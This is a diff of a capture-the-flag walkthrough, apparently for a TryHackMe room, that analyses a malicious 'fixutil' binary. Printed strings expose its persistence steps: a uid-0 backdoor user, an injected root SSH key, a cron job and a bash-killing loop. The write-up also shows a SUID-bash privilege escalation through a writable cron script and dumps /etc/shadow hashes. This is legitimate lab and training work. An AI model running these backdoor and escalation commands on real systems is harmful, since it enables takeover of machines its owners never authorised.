@@ -105,295 +105,92 @@ Connection to recovery closed.
 <code>THM{4c3e355694574cb182ca3057a685509d}</code></p>
 
 
-<h3>ssh parameters</h3>
-
 ```bash
-man ssh
+:~/Recovery/alex# file fixutil
+fixutil: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cc895c4c0b6852b9c57f08ecb87a232f0777f506, for GNU/Linux 3.2.0, not stripped
 ...
-    -s      May be used to request invocation of a subsystem on the remote system.  Subsystems facilitate the use of SSH as a secure transport for other applications
-             (e.g. sftp(1)).  The subsystem is specified as the remote command.
-
-     -T      Disable pseudo-terminal allocation.
-
-     -t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g. when
-             implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty.
+~/Recovery/alex# strings fixutil
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+fopen
+fclose
+system
+fwrite
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+...
+usr/local/apache2/htdocs/
+/opt/.fixutil/
+/opt/.fixutil/backup.txt
+/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
+sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
+/root/.ssh/authorized_keys
+/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
+/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
+/opt/brilliant_script.sh
+#!/bin/sh
+for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
+/etc/cron.d/evil
+* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
+:*3$"
+...
 ```
 
+<p><code>/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e</code></p>
 
+<p><code>for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;</code></p>
 
-```bash
--rw-r--r-- 1 alex alex  807 Apr 18  2019 .profile
--rwxrwxr-x 1 root root  37K Jun 12  2020 fixutil
-cat .bashrc
-# ~/.bashrc: executed by bash(1) for non-login shells.
-# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
-# for examples
+<p><code>* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog</code></p>
 
-# If not running interactively, don't do anything
-case $- in
-    *i*) ;;
-      *) return;;
-esac
-
-# don't put duplicate lines or lines starting with space in the history.
-# See bash(1) for more options
-HISTCONTROL=ignoreboth
-
-# append to the history file, don't overwrite it
-shopt -s histappend
-
-# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
-HISTSIZE=1000
-HISTFILESIZE=2000
-
-# check the window size after each command and, if necessary,
-# update the values of LINES and COLUMNS.
-shopt -s checkwinsize
-
-# If set, the pattern "**" used in a pathname expansion context will
-# match all files and zero or more directories and subdirectories.
-#shopt -s globstar
-
-# make less more friendly for non-text input files, see lesspipe(1)
-#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
-
-# set variable identifying the chroot you work in (used in the prompt below)
-if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
-    debian_chroot=$(cat /etc/debian_chroot)
-fi
-
-# set a fancy prompt (non-color, unless we know we "want" color)
-case "$TERM" in
-    xterm-color|*-256color) color_prompt=yes;;
-esac
-
-# uncomment for a colored prompt, if the terminal has the capability; turned
-# off by default to not distract the user: the focus in a terminal window
-# should be on the output of commands, not on the prompt
-#force_color_prompt=yes
-
-if [ -n "$force_color_prompt" ]; then
-    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
-	# We have color support; assume it's compliant with Ecma-48
-	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
-	# a case would tend to support setf rather than setaf.)
-	color_prompt=yes
-    else
-	color_prompt=
-    fi
-fi
-
-if [ "$color_prompt" = yes ]; then
-    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
-else
-    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
-fi
-unset color_prompt force_color_prompt
-
-# If this is an xterm set the title to user@host:dir
-case "$TERM" in
-xterm*|rxvt*)
-    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
-    ;;
-*)
-    ;;
-esac
-
-# enable color support of ls and also add handy aliases
-if [ -x /usr/bin/dircolors ]; then
-    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
-    alias ls='ls --color=auto'
-    #alias dir='dir --color=auto'
-    #alias vdir='vdir --color=auto'
-
-    #alias grep='grep --color=auto'
-    #alias fgrep='fgrep --color=auto'
-    #alias egrep='egrep --color=auto'
-fi
-
-# colored GCC warnings and errors
-#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
-
-# some more ls aliases
-#alias ll='ls -l'
-#alias la='ls -A'
-#alias l='ls -CF'
-
-# Alias definitions.
-# You may want to put all your additions into a separate file like
-# ~/.bash_aliases, instead of adding them here directly.
-# See /usr/share/doc/bash-doc/examples in the bash-doc package.
-
-if [ -f ~/.bash_aliases ]; then
-    . ~/.bash_aliases
-fi
-
-# enable programmable completion features (you don't need to enable
-# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
-# sources /etc/bash.bashrc).
-if ! shopt -oq posix; then
-  if [ -f /usr/share/bash-completion/bash_completion ]; then
-    . /usr/share/bash-completion/bash_completion
-  elif [ -f /etc/bash_completion ]; then
-    . /etc/bash_completion
-  fi
-fi
-
-
-while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
-$ rm -rf .bashrc
-```
+<p><code>/opt/.fixutil/</code>code></p>
+<p><code></p>/opt/.fixutil/backup.txt</code></p>
 
 <br>
 
 ```bash
-:~/Recovery# ssh alex@TargetIP
-alex@TargetIP's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu ... UTC 2020 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-alex@recoveryserver:~$ 
-```
-
-```bash
-:~/Recovery# ssh alex@TargetIP -T
-alex@TargetIP's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu ...UTC 2020 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-ls -lah
-total 60K
-drwxr-xr-x 1 alex alex 4.0K Jul  5 22:02 .
-drwxr-xr-x 1 root root 4.0K Jun 17  2020 ..
--rw-r--r-- 1 alex alex  220 Apr 18  2019 .bash_logout
--rw-r--r-- 1 alex alex  807 Apr 18  2019 .profile
--rwxrwxr-x 1 root root  37K Jun 12  2020 fixutil
-file fixutil
-fixutil: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cc895c4c0b6852b9c57f08ecb87a232f0777f506, for GNU/Linux 3.2.0, not stripped
-```
-
-
-<p>encoded the fix file to base64</p>
-
-```bash
-:~/Recovery# ssh alex@TargetIP
-alex@TargetIP's password: 
-Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu ... UTC 2020 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
+:~/Recovery/alex# ssh alex@recovery
+alex@recovery's password: 
 ...
-alex@recoveryserver:~$ wget http://1AttackIP:8000/.bashrc
---2025-07-05 22:22:20--  http://AttackIP:8000/.bashrc
-Connecting to AttackIP:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 4700 (4.6K) [application/octet-stream]
-Saving to: '.bashrc'
-
-.bashrc                                    100%[=======================================================================================>]   4.59K  --.-KB/s    in 0s      
-...
-alex@recoveryserver:~$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
-Debian-exim:x:105:106::/var/spool/exim4:/usr/sbin/nologin
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-alex:x:1000:1000::/home/alex:/bin/bash
-security:x:0:0::/home/security:/bin/sh
-alex@recoveryserver:~$ logout
-Connection to TargetIP closed.
-```
-
-```bash
-:~/Recovery# ssh alex@1TargetIP
-...
-alex@recoveryserver:~$ admin
-Welcome to the Recoverysoft Administration Tool! Please input your password:
-madeline
-Incorrect password! This will be logged!
-/bin/mv: cannot stat '/tmp/logging.so': No such file or directory
-alex@recoveryserver:~$ exit
-logout
-Connection to 1TargetIP closed.
-
-```
-
-```bash
-lex@recoveryserver:~$ sudo su
-[sudo] password for alex: 
-alex is not in the sudoers file.  This incident will be reported.
-alex@recoveryserver:~$ cd /opt
-alex@recoveryserver:/opt$ ls
-brilliant_script.sh
-alex@recoveryserver:/opt$ cat brilliant_script.sh
-#!/bin/sh
-
-for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
-alex@recoveryserver:/opt$ logout
-Connection to TargetIP closed.
-
-
-
 alex@recoveryserver:~$ cd /opt
 alex@recoveryserver:/opt$ ls
 brilliant_script.sh
 alex@recoveryserver:/opt$ echo "chmod u+s /bin/bash" > brilliant_script.sh
 alex@recoveryserver:/opt$ cat brilliant_script.sh
 chmod u+s /bin/bash
-alex@recoveryserver:/opt$ ls -lah /bin/bash
--rwsr-xr-x 1 root root 1.2M Apr 18  2019 /bin/bash
+alex@recoveryserver:/opt$ ls -la
+total 20
+drwxr-xr-x 1 root root 4096 Jun 17  2020 .
+drwxr-xr-x 1 root root 4096 Jun 17  2020 ..
+drwx------ 2 root root 4096 Jun 17  2020 .fixutil
+-rwxrwxrwx 1 root root   20 Jul  7 00:40 brilliant_script.sh
 alex@recoveryserver:/opt$ /bin/bash -p
-bash-5.0# id
-uid=1000(alex) gid=1000(alex) euid=0(root) groups=1000(alex)
-bash-5.0# cd /root
-bash-5.0# ls
-init_script.sh
+bash-5.0# 
 ```
 
+![image](https://github.com/user-attachments/assets/7744a257-991c-4233-af5a-3ba0f26f0bd6)
+
+<br>
+<br>
+
+<p><code>/opt/.fixutil/</code>code></p>
+<p><code></p>/opt/.fixutil/backup.txt</code></p>
 
 ```bash
-
+bash-5.0# cd /root
+bash-5.0# ls -la
+total 24
+drwx------ 1 root root 4096 Jun 17  2020 .
+drwxr-xr-x 1 root root 4096 Jun 17  2020 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x 1 root root 4096 Jun 17  2020 .ssh
+-rwxrwxr-x 1 root root   54 Jun 17  2020 init_script.sh
 bash-5.0# cat init_script.sh
 service ssh start
 service cron start
 httpd-foreground
-bash-5.0# cd ..
-bash-5.0# pwd
-/
 bash-5.0# cd /opt/.fixutil/
 bash-5.0# ls
 backup.txt
@@ -716,22 +513,19 @@ AAAAHAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAA
 AAB4MAAAAAAAAJAGAAAAAAAAHAAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAA
 AAAAAAAAAAAACDcAAAAAAACKAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAA
 AAAAAAAAAAAAAAAAAAAAAJI5AAAAAAAABwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
-
 ```
 
 ```bash
 :~/Recovery# nano adminb64
-root@ip-10-10-154-200:~/Recovery# chmod +x adminb64
-root@ip-10-10-154-200:~/Recovery# base64 -d adminb64 > admin
-root@ip-10-10-154-200:~/Recovery# chmod +x admin
-root@ip-10-10-154-200:~/Recovery# file admin
+:~/Recovery# base64 -d adminb64 > admin
+:~/Recovery# chmod +x admin
+:~/Recovery# file admin
 admin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=08edc8d505c845c14fd2350717ddabf8054ac395, not stripped
-root@ip-10-10-154-200:~/Recovery# 
-
+:~/Recovery# 
 ```
 
 ```bash
-~/Recovery# strings admin
+:~/Recovery# strings admin
 /lib64/ld-linux-x86-64.so.2
 mgUa
 liblogging.so
@@ -821,10 +615,136 @@ __cxa_finalize@@GLIBC_2.2.5
 .comment
 ```
 
+<p><code>Welcome to the Recoverysoft Administration Tool! Please input your password:</code></p>
 
 ```bash
+bash-5.0# /bin/admin
+Welcome to the Recoverysoft Administration Tool! Please input your password:
+d
+Incorrect password! This will be logged!
+/bin/mv: cannot stat '/tmp/logging.so': No such file or directory
+bash-5.0#
+...
+alex@recoveryserver:/opt$ /bin/bash -p
+bash-5.0# exit
+alex@recoveryserver:/opt$ 
+```
+
+![image](https://github.com/user-attachments/assets/f89ef1a0-34a6-4d04-932d-3ff1a8a60571)
+
+<br>
+
+<p>1.4. Flag 3<br>
+<code>THM{70f7de17bb4e08686977a061205f3bf0}</code></p>
+
+
+bash-5.0# cat /opt/.fixutil/backup.txt
+AdsipPewFlfkmll
+KZOQglIMwEZEOLN
+bash-5.0# 
+
+
+
 bash-5.0# pwd
-/
+/lib/x86_64-linux-gnu/security
+bash-5.0# ls
+pam_access.so  pam_faildelay.so  pam_lastlog.so    pam_mkhomedir.so  pam_rhosts.so     pam_stress.so	  pam_timestamp.so  pam_wheel.so
+pam_debug.so   pam_filter.so	 pam_limits.so	   pam_motd.so	     pam_rootok.so     pam_succeed_if.so  pam_tty_audit.so  pam_xauth.so
+pam_deny.so    pam_ftp.so	 pam_listfile.so   pam_namespace.so  pam_securetty.so  pam_systemd.so	  pam_umask.so
+pam_echo.so    pam_group.so	 pam_localuser.so  pam_nologin.so    pam_selinux.so    pam_tally.so	  pam_unix.so
+pam_env.so     pam_issue.so	 pam_loginuid.so   pam_permit.so     pam_sepermit.so   pam_tally2.so	  pam_userdb.so
+pam_exec.so    pam_keyinit.so	 pam_mail.so	   pam_pwhistory.so  pam_shells.so     pam_time.so	  pam_warn.so
+
+
+bash-5.0# cd cron.d
+bash-5.0# ls
+evil
+bash-5.0# file evil
+evil: ASCII text
+bash-5.0# cat evil
+
+* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
+
+bash-5.0# 
+
+
+
+
+```bash
+bash-5.0# whoami
+root
+bash-5.0# rm /root/.ssh/authorized_keys
+bash-5.0# ls
+authorized_keys  brilliant_script.sh
+bash-5.0# ls -la /root/.ssh/
+total 16
+drwxr-xr-x 1 root root 4096 Jul  7 01:28 .
+drwx------ 1 root root 4096 Jul  7 01:03 ..
+bash-5.0# 
+```
+
+![image](https://github.com/user-attachments/assets/9e852991-eb66-48ef-83b2-8a78ffb16366)
+
+
+
+```bash
+bash-5.0# cat /etc/shadow 
+root:*:18396:0:99999:7:::
+daemon:*:18396:0:99999:7:::
+bin:*:18396:0:99999:7:::
+sys:*:18396:0:99999:7:::
+sync:*:18396:0:99999:7:::
+games:*:18396:0:99999:7:::
+man:*:18396:0:99999:7:::
+lp:*:18396:0:99999:7:::
+mail:*:18396:0:99999:7:::
+news:*:18396:0:99999:7:::
+uucp:*:18396:0:99999:7:::
+proxy:*:18396:0:99999:7:::
+www-data:*:18396:0:99999:7:::
+backup:*:18396:0:99999:7:::
+list:*:18396:0:99999:7:::
+irc:*:18396:0:99999:7:::
+gnats:*:18396:0:99999:7:::
+nobody:*:18396:0:99999:7:::
+_apt:*:18396:0:99999:7:::
+systemd-timesync:*:18421:0:99999:7:::
+systemd-network:*:18421:0:99999:7:::
+systemd-resolve:*:18421:0:99999:7:::
+messagebus:*:18421:0:99999:7:::
+Debian-exim:!:18421:0:99999:7:::
+sshd:*:18421:0:99999:7:::
+alex:$6$vcMl0yk2GfmTUbNd$xuyw4BbFIqKyCSumvytbXc2P2EoQkea04XqdYtongud84By9/UkJVWX4Gnp9faVKSvg4nodureq.gziMFuVOH1:18430:0:99999:7:::
+security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/:20276:0:99999:7:::
+bash-5.0#
+```
+
+<p><code>security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/
+
+```bash
+:~/Recovery# ssh-keygen -f root
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in root
+Your public key has been saved in root.pub
+The key fingerprint is:
+SHA256:Fy0hTBb0qjtXpoqEPcxzwS+dYg2jDTwlH24Ck8Vvce4 root@ip-10-10-244-47
+The key's randomart image is:
++---[RSA 3072]----+
+|   ..  +*..      |
+|   o. ..oo o     |
+|  + ..o+  + .    |
+|   + *o... o     |
+|    =.O.S .      |
+|   = B OEoo      |
+|  . O B =+       |
+|   . *.+o        |
+|    . o+         |
++----[SHA256]-----+
+
+```
+
 bash-5.0# cd /root
 bash-5.0# ls
 init_script.sh
